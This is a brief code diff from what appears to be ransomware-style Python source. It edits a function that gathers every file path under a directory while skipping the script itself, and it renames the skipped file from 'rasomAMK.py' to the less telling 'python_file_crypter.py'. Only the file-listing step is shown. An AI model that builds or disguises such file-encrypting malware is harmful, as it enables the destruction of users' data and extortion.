@@ -17,7 +17,7 @@ def getAllFiles():
     dirs = []
     for dirName, subdirList, fileList in os.walk(dir_path):
         for fname in fileList:
-            if (fname != 'rasomAMK.py'):
+            if (fname != 'python_file_crypter.py'):
                 dirs.append(dirName + "/" + fname)
     return dirs
 
